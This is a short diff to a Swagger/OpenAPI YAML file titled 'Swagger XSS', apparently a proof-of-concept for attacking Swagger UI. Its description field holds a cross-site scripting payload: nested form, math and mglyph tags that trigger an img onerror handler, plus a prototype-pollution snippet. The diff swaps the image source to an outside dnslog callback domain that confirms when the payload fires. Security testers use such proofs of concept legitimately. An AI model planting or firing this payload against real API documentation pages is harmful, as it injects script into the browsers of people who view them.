@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Swagger XSS 
   description: |
-    <form><form><math><mglyph><img src=x onerror=alert(1)></mglyph></math></form></form>`, pre: () => { Object.prototype.depth = -1; }
+    <form><form><math><mglyph><img src=http://hoqqq7.dnslog.cn onerror=alert(1)></mglyph></math></form></form>`, pre: () => { Object.prototype.depth = -1; }
   version: production
 basePath: /JSSResource/
 produces:
@@ -36,3 +36,4 @@ paths:
       responses:
         '200':
           description: No response was specified
+
